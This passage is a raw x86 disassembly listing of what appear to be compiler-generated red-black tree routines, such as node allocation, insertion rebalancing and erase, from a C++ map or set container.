   14020:	mov    DWORD PTR [ecx],edi
   14022:	mov    ecx,DWORD PTR ds:0x7f6c8
   14028:	xor    eax,eax
   1402a:	mov    DWORD PTR [ecx+0x8],edi
   1402d:	inc    DWORD PTR ds:0x7f820
   14033:	cmp    eax,edi
   14035:	je     0x1403e
   14037:	push   eax
   14038:	call   0x10a9a
   1403d:	pop    ecx
   1403e:	push   edi
   1403f:	push   DWORD PTR ds:0x7f6c8
   14045:	mov    ecx,esi
   14047:	call   0x1395c
   1404c:	mov    DWORD PTR [esi+0xc],edi
   1404f:	mov    DWORD PTR [esi+0x4],eax
   14052:	mov    DWORD PTR [eax],eax
   14054:	mov    esi,DWORD PTR [esi+0x4]
   14057:	pop    edi
   14058:	mov    DWORD PTR [esi+0x8],esi
   1405b:	pop    esi
   1405c:	ret    
   1405d:	int3   
   1405e:	int3   
   1405f:	int3   
   14060:	int3   
   14061:	int3   
   14062:	mov    edi,edi
   14064:	push   ebp
   14065:	mov    ebp,esp
   14067:	push   esi
   14068:	push   edi
   14069:	push   DWORD PTR [ebp+0xc]
   1406c:	mov    edi,ecx
   1406e:	call   0x13120
   14073:	push   DWORD PTR [ebp+0xc]
   14076:	mov    ecx,edi
   14078:	mov    esi,eax
   1407a:	call   0x12e08
   1407f:	mov    ecx,DWORD PTR [ebp+0x8]
   14082:	pop    edi
   14083:	mov    DWORD PTR [ecx],eax
   14085:	mov    DWORD PTR [ecx+0x4],esi
   14088:	mov    eax,ecx
   1408a:	pop    esi
   1408b:	pop    ebp
   1408c:	ret    0x8
   1408f:	int3   
   14090:	int3   
   14091:	int3   
   14092:	int3   
   14093:	int3   
   14094:	mov    edi,edi
   14096:	push   esi
   14097:	push   edi
   14098:	push   0x1
   1409a:	xor    edi,edi
   1409c:	push   edi
   1409d:	mov    esi,ecx
   1409f:	call   0x13980
   140a4:	cmp    DWORD PTR ds:0x7f6d4,edi
   140aa:	jne    0x140c1
   140ac:	mov    ecx,eax
   140ae:	mov    DWORD PTR ds:0x7f6d4,ecx
   140b4:	mov    DWORD PTR [ecx],edi
   140b6:	mov    ecx,DWORD PTR ds:0x7f6d4
   140bc:	xor    eax,eax
   140be:	mov    DWORD PTR [ecx+0x8],edi
   140c1:	inc    DWORD PTR ds:0x7f824
   140c7:	cmp    eax,edi
   140c9:	je     0x140d2
   140cb:	push   eax
   140cc:	call   0x10a9a
   140d1:	pop    ecx
   140d2:	push   edi
   140d3:	push   DWORD PTR ds:0x7f6d4
   140d9:	mov    ecx,esi
   140db:	call   0x13980
   140e0:	mov    DWORD PTR [esi+0xc],edi
   140e3:	mov    DWORD PTR [esi+0x4],eax
   140e6:	mov    DWORD PTR [eax],eax
   140e8:	mov    esi,DWORD PTR [esi+0x4]
   140eb:	pop    edi
   140ec:	mov    DWORD PTR [esi+0x8],esi
   140ef:	pop    esi
   140f0:	ret    
   140f1:	int3   
   140f2:	int3   
   140f3:	int3   
   140f4:	int3   
   140f5:	int3   
   140f6:	mov    edi,edi
   140f8:	push   ebp
   140f9:	mov    ebp,esp
   140fb:	push   esi
   140fc:	push   edi
   140fd:	push   DWORD PTR [ebp+0xc]
   14100:	mov    edi,ecx
   14102:	call   0x131fe
   14107:	push   DWORD PTR [ebp+0xc]
   1410a:	mov    ecx,edi
   1410c:	mov    esi,eax
   1410e:	call   0x12e48
   14113:	mov    ecx,DWORD PTR [ebp+0x8]
   14116:	pop    edi
   14117:	mov    DWORD PTR [ecx],eax
   14119:	mov    DWORD PTR [ecx+0x4],esi
   1411c:	mov    eax,ecx
   1411e:	pop    esi
   1411f:	pop    ebp
   14120:	ret    0x8
   14123:	int3   
   14124:	int3   
   14125:	int3   
   14126:	int3   
   14127:	int3   
   14128:	mov    edi,edi
   1412a:	push   esi
   1412b:	push   edi
   1412c:	push   0x1
   1412e:	xor    edi,edi
   14130:	push   edi
   14131:	mov    esi,ecx
   14133:	call   0x139ec
   14138:	cmp    DWORD PTR ds:0x7f6d8,edi
   1413e:	jne    0x14155
   14140:	mov    ecx,eax
   14142:	mov    DWORD PTR ds:0x7f6d8,ecx
   14148:	mov    DWORD PTR [ecx],edi
   1414a:	mov    ecx,DWORD PTR ds:0x7f6d8
   14150:	xor    eax,eax
   14152:	mov    DWORD PTR [ecx+0x8],edi
   14155:	inc    DWORD PTR ds:0x7f828
   1415b:	cmp    eax,edi
   1415d:	je     0x14166
   1415f:	push   eax
   14160:	call   0x10a9a
   14165:	pop    ecx
   14166:	push   edi
   14167:	push   DWORD PTR ds:0x7f6d8
   1416d:	mov    ecx,esi
   1416f:	call   0x139ec
   14174:	mov    DWORD PTR [esi+0xc],edi
   14177:	mov    DWORD PTR [esi+0x4],eax
   1417a:	mov    DWORD PTR [eax],eax
   1417c:	mov    esi,DWORD PTR [esi+0x4]
   1417f:	pop    edi
   14180:	mov    DWORD PTR [esi+0x8],esi
   14183:	pop    esi
   14184:	ret    
   14185:	int3   
   14186:	int3   
   14187:	int3   
   14188:	int3   
   14189:	int3   
   1418a:	mov    edi,edi
   1418c:	push   ebp
   1418d:	mov    ebp,esp
   1418f:	push   esi
   14190:	push   edi
   14191:	push   DWORD PTR [ebp+0xc]
   14194:	mov    edi,ecx
   14196:	call   0x132dc
   1419b:	push   DWORD PTR [ebp+0xc]
   1419e:	mov    ecx,edi
   141a0:	mov    esi,eax
   141a2:	call   0x12e88
   141a7:	mov    ecx,DWORD PTR [ebp+0x8]
   141aa:	pop    edi
   141ab:	mov    DWORD PTR [ecx],eax
   141ad:	mov    DWORD PTR [ecx+0x4],esi
   141b0:	mov    eax,ecx
   141b2:	pop    esi
   141b3:	pop    ebp
   141b4:	ret    0x8
   141b7:	int3   
   141b8:	int3   
   141b9:	int3   
   141ba:	int3   
   141bb:	int3   
   141bc:	mov    edi,edi
   141be:	push   esi
   141bf:	push   edi
   141c0:	push   0x1
   141c2:	xor    edi,edi
   141c4:	push   edi
   141c5:	mov    esi,ecx
   141c7:	call   0x1395c
   141cc:	cmp    DWORD PTR ds:0x7f6dc,edi
   141d2:	jne    0x141e9
   141d4:	mov    ecx,eax
   141d6:	mov    DWORD PTR ds:0x7f6dc,ecx
   141dc:	mov    DWORD PTR [ecx],edi
   141de:	mov    ecx,DWORD PTR ds:0x7f6dc
   141e4:	xor    eax,eax
   141e6:	mov    DWORD PTR [ecx+0x8],edi
   141e9:	inc    DWORD PTR ds:0x7f82c
   141ef:	cmp    eax,edi
   141f1:	je     0x141fa
   141f3:	push   eax
   141f4:	call   0x10a9a
   141f9:	pop    ecx
   141fa:	push   edi
   141fb:	push   DWORD PTR ds:0x7f6dc
   14201:	mov    ecx,esi
   14203:	call   0x1395c
   14208:	mov    DWORD PTR [esi+0xc],edi
   1420b:	mov    DWORD PTR [esi+0x4],eax
   1420e:	mov    DWORD PTR [eax],eax
   14210:	mov    esi,DWORD PTR [esi+0x4]
   14213:	pop    edi
   14214:	mov    DWORD PTR [esi+0x8],esi
   14217:	pop    esi
   14218:	ret    
   14219:	int3   
   1421a:	int3   
   1421b:	int3   
   1421c:	int3   
   1421d:	int3   
   1421e:	mov    edi,edi
   14220:	push   ebp
   14221:	mov    ebp,esp
   14223:	push   ecx
   14224:	push   esi
   14225:	push   DWORD PTR [ebp+0xc]
   14228:	mov    esi,ecx
   1422a:	call   0x13314
   1422f:	mov    DWORD PTR [ebp-0x4],eax
   14232:	cmp    eax,DWORD PTR [esi+0x4]
   14235:	je     0x1424c
   14237:	add    eax,0xc
   1423a:	push   eax
   1423b:	push   DWORD PTR [ebp+0xc]
   1423e:	call   0x19834
   14243:	test   al,al
   14245:	jne    0x1424c
   14247:	lea    eax,[ebp-0x4]
   1424a:	jmp    0x14255
   1424c:	mov    eax,DWORD PTR [esi+0x4]
   1424f:	mov    DWORD PTR [ebp+0xc],eax
   14252:	lea    eax,[ebp+0xc]
   14255:	mov    ecx,DWORD PTR [eax]
   14257:	mov    eax,DWORD PTR [ebp+0x8]
   1425a:	mov    DWORD PTR [eax],ecx
   1425c:	pop    esi
   1425d:	leave  
   1425e:	ret    0x8
   14261:	int3   
   14262:	int3   
   14263:	int3   
   14264:	int3   
   14265:	int3   
   14266:	mov    edi,edi
   14268:	push   ebp
   14269:	mov    ebp,esp
   1426b:	push   ecx
   1426c:	push   ecx
   1426d:	push   ebx
   1426e:	push   esi
   1426f:	mov    DWORD PTR [ebp-0x4],ecx
   14272:	push   edi
   14273:	mov    edi,DWORD PTR [ebp+0xc]
   14276:	lea    ecx,[ebp+0xc]
   14279:	call   0x12f36
   1427e:	mov    esi,DWORD PTR [edi]
   14280:	mov    eax,ds:0x7f6cc
   14285:	mov    ebx,edi
   14287:	mov    DWORD PTR [ebp-0x8],esi
   1428a:	cmp    esi,eax
   1428c:	jne    0x142aa
   1428e:	mov    esi,DWORD PTR [edi+0x8]
   14291:	mov    eax,DWORD PTR [ebx+0x4]
   14294:	mov    ecx,DWORD PTR [ebp-0x4]
   14297:	mov    DWORD PTR [esi+0x4],eax
   1429a:	mov    eax,DWORD PTR [ecx+0x4]
   1429d:	cmp    DWORD PTR [eax+0x4],edi
   142a0:	jne    0x1431f
   142a2:	mov    DWORD PTR [eax+0x4],esi
   142a5:	jmp    0x1432d
   142aa:	mov    ecx,DWORD PTR [edi+0x8]
   142ad:	cmp    ecx,eax
   142af:	je     0x14291
   142b1:	push   ecx
   142b2:	call   0x11224
   142b7:	mov    ebx,eax
   142b9:	mov    esi,DWORD PTR [ebx+0x8]
   142bc:	cmp    ebx,edi
   142be:	je     0x14291
   142c0:	mov    eax,DWORD PTR [ebp-0x8]
   142c3:	mov    DWORD PTR [eax+0x4],ebx
   142c6:	mov    eax,DWORD PTR [edi]
   142c8:	mov    DWORD PTR [ebx],eax
   142ca:	cmp    ebx,DWORD PTR [edi+0x8]
   142cd:	jne    0x142d4
   142cf:	mov    DWORD PTR [esi+0x4],ebx
   142d2:	jmp    0x142eb
   142d4:	mov    eax,DWORD PTR [ebx+0x4]
   142d7:	mov    DWORD PTR [esi+0x4],eax
   142da:	mov    eax,DWORD PTR [ebx+0x4]
   142dd:	mov    DWORD PTR [eax],esi
   142df:	mov    eax,DWORD PTR [edi+0x8]
   142e2:	mov    DWORD PTR [ebx+0x8],eax
   142e5:	mov    eax,DWORD PTR [edi+0x8]
   142e8:	mov    DWORD PTR [eax+0x4],ebx
   142eb:	mov    eax,DWORD PTR [ebp-0x4]
   142ee:	mov    eax,DWORD PTR [eax+0x4]
   142f1:	cmp    DWORD PTR [eax+0x4],edi
   142f4:	jne    0x142fb
   142f6:	mov    DWORD PTR [eax+0x4],ebx
   142f9:	jmp    0x14309
   142fb:	mov    eax,DWORD PTR [edi+0x4]
   142fe:	cmp    DWORD PTR [eax],edi
   14300:	jne    0x14306
   14302:	mov    DWORD PTR [eax],ebx
   14304:	jmp    0x14309
   14306:	mov    DWORD PTR [eax+0x8],ebx
   14309:	mov    eax,DWORD PTR [edi+0x4]
   1430c:	mov    DWORD PTR [ebx+0x4],eax
   1430f:	mov    eax,DWORD PTR [ebx+0x10]
   14312:	mov    ecx,DWORD PTR [edi+0x10]
   14315:	mov    DWORD PTR [ebx+0x10],ecx
   14318:	mov    DWORD PTR [edi+0x10],eax
   1431b:	mov    ebx,edi
   1431d:	jmp    0x14380
   1431f:	mov    eax,DWORD PTR [edi+0x4]
   14322:	cmp    DWORD PTR [eax],edi
   14324:	jne    0x1432a
   14326:	mov    DWORD PTR [eax],esi
   14328:	jmp    0x1432d
   1432a:	mov    DWORD PTR [eax+0x8],esi
   1432d:	mov    eax,DWORD PTR [ecx+0x4]
   14330:	mov    DWORD PTR [ebp-0x8],eax
   14333:	cmp    DWORD PTR [eax],edi
   14335:	jne    0x14357
   14337:	mov    edx,DWORD PTR [edi+0x8]
   1433a:	cmp    edx,DWORD PTR ds:0x7f6cc
   14340:	jne    0x14349
   14342:	mov    edx,DWORD PTR [edi+0x4]
   14345:	mov    DWORD PTR [eax],edx
   14347:	jmp    0x14357
   14349:	push   esi
   1434a:	call   0x11224
   1434f:	mov    ecx,DWORD PTR [ebp-0x8]
   14352:	mov    DWORD PTR [ecx],eax
   14354:	mov    ecx,DWORD PTR [ebp-0x4]
   14357:	mov    eax,DWORD PTR [ecx+0x4]
   1435a:	mov    DWORD PTR [ebp-0x8],eax
   1435d:	cmp    DWORD PTR [eax+0x8],edi
   14360:	jne    0x14380
   14362:	mov    ecx,DWORD PTR [edi]
   14364:	cmp    ecx,DWORD PTR ds:0x7f6cc
   1436a:	jne    0x14374
   1436c:	mov    ecx,DWORD PTR [edi+0x4]
   1436f:	mov    DWORD PTR [eax+0x8],ecx
   14372:	jmp    0x14380
   14374:	push   esi
   14375:	call   0x11202
   1437a:	mov    ecx,DWORD PTR [ebp-0x8]
   1437d:	mov    DWORD PTR [ecx+0x8],eax
   14380:	xor    edi,edi
   14382:	inc    edi
   14383:	cmp    DWORD PTR [ebx+0x10],edi
   14386:	jne    0x1449d
   1438c:	jmp    0x1444b
   14391:	cmp    DWORD PTR [esi+0x10],edi
   14394:	jne    0x1449a
   1439a:	mov    eax,DWORD PTR [esi+0x4]
   1439d:	cmp    esi,DWORD PTR [eax]
   1439f:	jne    0x14416
   143a1:	mov    eax,DWORD PTR [eax+0x8]
   143a4:	cmp    DWORD PTR [eax+0x10],0x0
   143a8:	jne    0x143c2
   143aa:	mov    DWORD PTR [eax+0x10],edi
   143ad:	mov    eax,DWORD PTR [esi+0x4]
   143b0:	and    DWORD PTR [eax+0x10],0x0
   143b4:	push   DWORD PTR [esi+0x4]
   143b7:	call   0x12f6c
   143bc:	mov    eax,DWORD PTR [esi+0x4]
   143bf:	mov    eax,DWORD PTR [eax+0x8]
   143c2:	mov    ecx,DWORD PTR [eax]
   143c4:	cmp    DWORD PTR [ecx+0x10],edi
   143c7:	jne    0x143d1
   143c9:	mov    ecx,DWORD PTR [eax+0x8]
   143cc:	cmp    DWORD PTR [ecx+0x10],edi
   143cf:	je     0x14444
   143d1:	mov    ecx,DWORD PTR [eax+0x8]
   143d4:	cmp    DWORD PTR [ecx+0x10],edi
   143d7:	jne    0x143f1
   143d9:	mov    ecx,DWORD PTR [eax]
   143db:	mov    DWORD PTR [ecx+0x10],edi
   143de:	mov    ecx,DWORD PTR [ebp-0x4]
   143e1:	and    DWORD PTR [eax+0x10],0x0
   143e5:	push   eax
   143e6:	call   0x12fba
   143eb:	mov    eax,DWORD PTR [esi+0x4]
   143ee:	mov    eax,DWORD PTR [eax+0x8]
   143f1:	mov    ecx,DWORD PTR [esi+0x4]
   143f4:	mov    ecx,DWORD PTR [ecx+0x10]
   143f7:	mov    DWORD PTR [eax+0x10],ecx
   143fa:	mov    ecx,DWORD PTR [esi+0x4]
   143fd:	mov    DWORD PTR [ecx+0x10],edi
   14400:	mov    eax,DWORD PTR [eax+0x8]
   14403:	mov    ecx,DWORD PTR [ebp-0x4]
   14406:	mov    DWORD PTR [eax+0x10],edi
   14409:	push   DWORD PTR [esi+0x4]
   1440c:	call   0x12f6c
   14411:	jmp    0x1449a
   14416:	mov    eax,DWORD PTR [eax]
   14418:	cmp    DWORD PTR [eax+0x10],0x0
   1441c:	jne    0x14435
   1441e:	mov    DWORD PTR [eax+0x10],edi
   14421:	mov    eax,DWORD PTR [esi+0x4]
   14424:	and    DWORD PTR [eax+0x10],0x0
   14428:	push   DWORD PTR [esi+0x4]
   1442b:	call   0x12fba
   14430:	mov    eax,DWORD PTR [esi+0x4]
   14433:	mov    eax,DWORD PTR [eax]
   14435:	mov    ecx,DWORD PTR [eax+0x8]
   14438:	cmp    DWORD PTR [ecx+0x10],edi
   1443b:	jne    0x1445c
   1443d:	mov    ecx,DWORD PTR [eax]
   1443f:	cmp    DWORD PTR [ecx+0x10],edi
   14442:	jne    0x1445c
   14444:	and    DWORD PTR [eax+0x10],0x0
   14448:	mov    esi,DWORD PTR [esi+0x4]
   1444b:	mov    ecx,DWORD PTR [ebp-0x4]
   1444e:	mov    eax,DWORD PTR [ecx+0x4]
   14451:	cmp    esi,DWORD PTR [eax+0x4]
   14454:	jne    0x14391
   1445a:	jmp    0x1449a
   1445c:	mov    ecx,DWORD PTR [eax]
   1445e:	cmp    DWORD PTR [ecx+0x10],edi
   14461:	jne    0x1447b
   14463:	mov    ecx,DWORD PTR [eax+0x8]
   14466:	mov    DWORD PTR [ecx+0x10],edi
   14469:	mov    ecx,DWORD PTR [ebp-0x4]
   1446c:	and    DWORD PTR [eax+0x10],0x0
   14470:	push   eax
   14471:	call   0x12f6c
   14476:	mov    eax,DWORD PTR [esi+0x4]
   14479:	mov    eax,DWORD PTR [eax]
   1447b:	mov    ecx,DWORD PTR [esi+0x4]
   1447e:	mov    ecx,DWORD PTR [ecx+0x10]
   14481:	mov    DWORD PTR [eax+0x10],ecx
   14484:	mov    ecx,DWORD PTR [esi+0x4]
   14487:	mov    DWORD PTR [ecx+0x10],edi
   1448a:	mov    eax,DWORD PTR [eax]
   1448c:	mov    ecx,DWORD PTR [ebp-0x4]
   1448f:	mov    DWORD PTR [eax+0x10],edi
   14492:	push   DWORD PTR [esi+0x4]
   14495:	call   0x12fba
   1449a:	mov    DWORD PTR [esi+0x10],edi
   1449d:	push   ebx
   1449e:	call   0x10a9a
   144a3:	mov    eax,DWORD PTR [ebp-0x4]
   144a6:	dec    DWORD PTR [eax+0xc]
   144a9:	mov    eax,DWORD PTR [ebp+0x8]
   144ac:	pop    ecx
   144ad:	mov    ecx,DWORD PTR [ebp+0xc]
   144b0:	pop    edi
   144b1:	pop    esi
   144b2:	mov    DWORD PTR [eax],ecx
   144b4:	pop    ebx
   144b5:	leave  
   144b6:	ret    0x8
   144b9:	int3   
   144ba:	int3   
   144bb:	int3   
   144bc:	int3   
   144bd:	int3   
   144be:	mov    edi,edi
   144c0:	push   ebp
   144c1:	mov    ebp,esp
   144c3:	push   esi
   144c4:	push   edi
   144c5:	push   DWORD PTR [ebp+0xc]
   144c8:	mov    edi,ecx
   144ca:	call   0x1346a
   144cf:	push   DWORD PTR [ebp+0xc]
   144d2:	mov    ecx,edi
   144d4:	mov    esi,eax
   144d6:	call   0x13432
   144db:	mov    ecx,DWORD PTR [ebp+0x8]
   144de:	pop    edi
   144df:	mov    DWORD PTR [ecx],eax
   144e1:	mov    DWORD PTR [ecx+0x4],esi
   144e4:	mov    eax,ecx
   144e6:	pop    esi
   144e7:	pop    ebp
   144e8:	ret    0x8
   144eb:	int3   
   144ec:	int3   
   144ed:	int3   
   144ee:	int3   
   144ef:	int3   
   144f0:	mov    edi,edi
   144f2:	push   esi
   144f3:	push   edi
   144f4:	push   0x1
   144f6:	xor    edi,edi
   144f8:	push   edi
   144f9:	mov    esi,ecx
   144fb:	call   0x139a4
   14500:	cmp    DWORD PTR ds:0x7f6cc,edi
   14506:	jne    0x1451d
   14508:	mov    ecx,eax
   1450a:	mov    DWORD PTR ds:0x7f6cc,ecx
   14510:	mov    DWORD PTR [ecx],edi
   14512:	mov    ecx,DWORD PTR ds:0x7f6cc
   14518:	xor    eax,eax
   1451a:	mov    DWORD PTR [ecx+0x8],edi
   1451d:	inc    DWORD PTR ds:0x7f830
   14523:	cmp    eax,edi
   14525:	je     0x1452e
   14527:	push   eax
   14528:	call   0x10a9a
   1452d:	pop    ecx
   1452e:	push   edi
   1452f:	push   DWORD PTR ds:0x7f6cc
   14535:	mov    ecx,esi
   14537:	call   0x139a4
   1453c:	mov    DWORD PTR [esi+0xc],edi
   1453f:	mov    DWORD PTR [esi+0x4],eax
   14542:	mov    DWORD PTR [eax],eax
   14544:	mov    esi,DWORD PTR [esi+0x4]
   14547:	pop    edi
   14548:	mov    DWORD PTR [esi+0x8],esi
   1454b:	pop    esi
   1454c:	ret    
   1454d:	int3   
   1454e:	int3   
   1454f:	int3   
   14550:	int3   
   14551:	int3   
   14552:	mov    edi,edi
   14554:	push   ebp
   14555:	mov    ebp,esp
   14557:	push   ebx
   14558:	push   esi
   14559:	mov    esi,DWORD PTR [ebp+0x10]
   1455c:	push   edi
   1455d:	push   0x0
   1455f:	push   esi
   14560:	mov    edi,ecx
   14562:	call   0x139a4
   14567:	push   DWORD PTR [ebp+0x14]
   1456a:	mov    ebx,eax
   1456c:	mov    eax,ds:0x7f6cc
   14571:	mov    DWORD PTR [ebx],eax
   14573:	mov    eax,ds:0x7f6cc
   14578:	mov    DWORD PTR [ebx+0x8],eax
   1457b:	lea    eax,[ebx+0xc]
   1457e:	push   eax
   1457f:	call   0x1163a
   14584:	inc    DWORD PTR [edi+0xc]
   14587:	cmp    esi,DWORD PTR [edi+0x4]
   1458a:	je     0x145ae
   1458c:	mov    eax,DWORD PTR [ebp+0xc]
   1458f:	cmp    eax,DWORD PTR ds:0x7f6cc
   14595:	jne    0x145ae
   14597:	mov    eax,DWORD PTR [ebp+0x14]
   1459a:	mov    eax,DWORD PTR [eax]
   1459c:	cmp    eax,DWORD PTR [esi+0xc]
   1459f:	jb     0x145ae
   145a1:	mov    DWORD PTR [esi+0x8],ebx
   145a4:	mov    eax,DWORD PTR [edi+0x4]
   145a7:	cmp    esi,DWORD PTR [eax+0x8]
   145aa:	jne    0x145c8
   145ac:	jmp    0x145bd
   145ae:	mov    DWORD PTR [esi],ebx
   145b0:	mov    eax,DWORD PTR [edi+0x4]
   145b3:	cmp    esi,eax
   145b5:	jne    0x145c2
   145b7:	mov    DWORD PTR [eax+0x4],ebx
   145ba:	mov    eax,DWORD PTR [edi+0x4]
   145bd:	mov    DWORD PTR [eax+0x8],ebx
   145c0:	jmp    0x145c8
   145c2:	cmp    esi,DWORD PTR [eax]
   145c4:	jne    0x145c8
   145c6:	mov    DWORD PTR [eax],ebx
   145c8:	mov    eax,DWORD PTR [edi+0x4]
   145cb:	mov    esi,ebx
   145cd:	cmp    ebx,DWORD PTR [eax+0x4]
   145d0:	je     0x14684
   145d6:	mov    eax,DWORD PTR [esi+0x4]
   145d9:	xor    edx,edx
   145db:	cmp    DWORD PTR [eax+0x10],edx
   145de:	jne    0x14684
   145e4:	mov    ecx,DWORD PTR [eax+0x4]
   145e7:	cmp    eax,DWORD PTR [ecx]
   145e9:	jne    0x14625
   145eb:	mov    ecx,DWORD PTR [ecx+0x8]
   145ee:	cmp    DWORD PTR [ecx+0x10],edx
   145f1:	je     0x1462c
   145f3:	cmp    esi,DWORD PTR [eax+0x8]
   145f6:	jne    0x14602
   145f8:	mov    esi,eax
   145fa:	push   esi
   145fb:	mov    ecx,edi
   145fd:	call   0x12f6c
   14602:	mov    eax,DWORD PTR [esi+0x4]
   14605:	mov    DWORD PTR [eax+0x10],0x1
   1460c:	mov    eax,DWORD PTR [esi+0x4]
   1460f:	mov    eax,DWORD PTR [eax+0x4]
   14612:	and    DWORD PTR [eax+0x10],0x0
   14616:	mov    eax,DWORD PTR [esi+0x4]
   14619:	push   DWORD PTR [eax+0x4]
   1461c:	mov    ecx,edi
   1461e:	call   0x12fba
   14623:	jmp    0x14678
   14625:	mov    ecx,DWORD PTR [ecx]
   14627:	cmp    DWORD PTR [ecx+0x10],edx
   1462a:	jne    0x14649
   1462c:	mov    edx,eax
   1462e:	xor    eax,eax
   14630:	inc    eax
   14631:	mov    DWORD PTR [edx+0x10],eax
   14634:	mov    DWORD PTR [ecx+0x10],eax
   14637:	mov    eax,DWORD PTR [esi+0x4]
   1463a:	mov    eax,DWORD PTR [eax+0x4]
   1463d:	and    DWORD PTR [eax+0x10],0x0
   14641:	mov    eax,DWORD PTR [esi+0x4]
   14644:	mov    esi,DWORD PTR [eax+0x4]
   14647:	jmp    0x14678
   14649:	cmp    esi,DWORD PTR [eax]
   1464b:	jne    0x14657
   1464d:	mov    esi,eax
   1464f:	push   esi
   14650:	mov    ecx,edi
   14652:	call   0x12fba
   14657:	mov    eax,DWORD PTR [esi+0x4]
   1465a:	mov    DWORD PTR [eax+0x10],0x1
   14661:	mov    eax,DWORD PTR [esi+0x4]
   14664:	mov    eax,DWORD PTR [eax+0x4]
   14667:	and    DWORD PTR [eax+0x10],0x0
   1466b:	mov    eax,DWORD PTR [esi+0x4]
   1466e:	push   DWORD PTR [eax+0x4]
   14671:	mov    ecx,edi
   14673:	call   0x12f6c
   14678:	mov    eax,DWORD PTR [edi+0x4]
   1467b:	cmp    esi,DWORD PTR [eax+0x4]
   1467e:	jne    0x145d6
   14684:	mov    eax,DWORD PTR [edi+0x4]
   14687:	mov    eax,DWORD PTR [eax+0x4]
   1468a:	pop    edi
   1468b:	mov    DWORD PTR [eax+0x10],0x1
   14692:	mov    eax,DWORD PTR [ebp+0x8]
   14695:	pop    esi
   14696:	mov    DWORD PTR [eax],ebx
   14698:	pop    ebx
   14699:	pop    ebp
   1469a:	ret    0x10
   1469d:	int3   
   1469e:	int3   
   1469f:	int3   
   146a0:	int3   
   146a1:	int3   
   146a2:	mov    edi,edi
   146a4:	push   esi
   146a5:	push   edi
   146a6:	push   0x1
   146a8:	xor    edi,edi
   146aa:	push   edi
   146ab:	mov    esi,ecx
   146ad:	call   0x139c8
   146b2:	cmp    DWORD PTR ds:0x7f6d0,edi
   146b8:	jne    0x146cf
   146ba:	mov    ecx,eax
   146bc:	mov    DWORD PTR ds:0x7f6d0,ecx
   146c2:	mov    DWORD PTR [ecx],edi
   146c4:	mov    ecx,DWORD PTR ds:0x7f6d0
   146ca:	xor    eax,eax
   146cc:	mov    DWORD PTR [ecx+0x8],edi
   146cf:	inc    DWORD PTR ds:0x7f834
   146d5:	cmp    eax,edi
   146d7:	je     0x146e0
   146d9:	push   eax
   146da:	call   0x10a9a
   146df:	pop    ecx
   146e0:	push   edi
   146e1:	push   DWORD PTR ds:0x7f6d0
   146e7:	mov    ecx,esi
   146e9:	call   0x139c8
   146ee:	mov    DWORD PTR [esi+0xc],edi
   146f1:	mov    DWORD PTR [esi+0x4],eax
   146f4:	mov    DWORD PTR [eax],eax
   146f6:	mov    esi,DWORD PTR [esi+0x4]
   146f9:	pop    edi
   146fa:	mov    DWORD PTR [esi+0x8],esi
   146fd:	pop    esi
   146fe:	ret    
   146ff:	int3   
   14700:	int3   
   14701:	int3   
   14702:	int3   
   14703:	int3   
   14704:	mov    edi,edi
   14706:	push   ebp
   14707:	mov    ebp,esp
   14709:	push   ebx
   1470a:	push   esi
   1470b:	mov    esi,DWORD PTR [ebp+0x10]
   1470e:	push   edi
   1470f:	push   0x0
   14711:	push   esi
   14712:	mov    edi,ecx
   14714:	call   0x1395c
   14719:	push   DWORD PTR [ebp+0x14]
   1471c:	mov    ebx,eax
   1471e:	mov    eax,ds:0x7f6c8
   14723:	mov    DWORD PTR [ebx],eax
   14725:	mov    eax,ds:0x7f6c8
   1472a:	mov    DWORD PTR [ebx+0x8],eax
   1472d:	lea    eax,[ebx+0xc]
   14730:	push   eax
   14731:	call   0x11656
   14736:	inc    DWORD PTR [edi+0xc]
   14739:	cmp    esi,DWORD PTR [edi+0x4]
   1473c:	je     0x14760
   1473e:	mov    eax,DWORD PTR [ebp+0xc]
   14741:	cmp    eax,DWORD PTR ds:0x7f6c8
   14747:	jne    0x14760
   14749:	mov    eax,DWORD PTR [ebp+0x14]
   1474c:	mov    eax,DWORD PTR [eax]
   1474e:	cmp    eax,DWORD PTR [esi+0xc]
   14751:	jb     0x14760
   14753:	mov    DWORD PTR [esi+0x8],ebx
   14756:	mov    eax,DWORD PTR [edi+0x4]
   14759:	cmp    esi,DWORD PTR [eax+0x8]
   1475c:	jne    0x1477a
   1475e:	jmp    0x1476f
   14760:	mov    DWORD PTR [esi],ebx
   14762:	mov    eax,DWORD PTR [edi+0x4]
   14765:	cmp    esi,eax
   14767:	jne    0x14774
   14769:	mov    DWORD PTR [eax+0x4],ebx
   1476c:	mov    eax,DWORD PTR [edi+0x4]
   1476f:	mov    DWORD PTR [eax+0x8],ebx
   14772:	jmp    0x1477a
   14774:	cmp    esi,DWORD PTR [eax]
   14776:	jne    0x1477a
   14778:	mov    DWORD PTR [eax],ebx
   1477a:	mov    eax,DWORD PTR [edi+0x4]
   1477d:	mov    esi,ebx
   1477f:	cmp    ebx,DWORD PTR [eax+0x4]
   14782:	je     0x14836
   14788:	mov    eax,DWORD PTR [esi+0x4]
   1478b:	xor    edx,edx
   1478d:	cmp    DWORD PTR [eax+0x14],edx
   14790:	jne    0x14836
   14796:	mov    ecx,DWORD PTR [eax+0x4]
   14799:	cmp    eax,DWORD PTR [ecx]
   1479b:	jne    0x147d7
   1479d:	mov    ecx,DWORD PTR [ecx+0x8]
   147a0:	cmp    DWORD PTR [ecx+0x14],edx
   147a3:	je     0x147de
   147a5:	cmp    esi,DWORD PTR [eax+0x8]
   147a8:	jne    0x147b4
   147aa:	mov    esi,eax
   147ac:	push   esi
   147ad:	mov    ecx,edi
   147af:	call   0x12d6a
   147b4:	mov    eax,DWORD PTR [esi+0x4]
   147b7:	mov    DWORD PTR [eax+0x14],0x1
   147be:	mov    eax,DWORD PTR [esi+0x4]
   147c1:	mov    eax,DWORD PTR [eax+0x4]
   147c4:	and    DWORD PTR [eax+0x14],0x0
   147c8:	mov    eax,DWORD PTR [esi+0x4]
   147cb:	push   DWORD PTR [eax+0x4]
   147ce:	mov    ecx,edi
   147d0:	call   0x12db8
   147d5:	jmp    0x1482a
   147d7:	mov    ecx,DWORD PTR [ecx]
   147d9:	cmp    DWORD PTR [ecx+0x14],edx
   147dc:	jne    0x147fb
   147de:	mov    edx,eax
   147e0:	xor    eax,eax
   147e2:	inc    eax
   147e3:	mov    DWORD PTR [edx+0x14],eax
   147e6:	mov    DWORD PTR [ecx+0x14],eax
   147e9:	mov    eax,DWORD PTR [esi+0x4]
   147ec:	mov    eax,DWORD PTR [eax+0x4]
   147ef:	and    DWORD PTR [eax+0x14],0x0
   147f3:	mov    eax,DWORD PTR [esi+0x4]
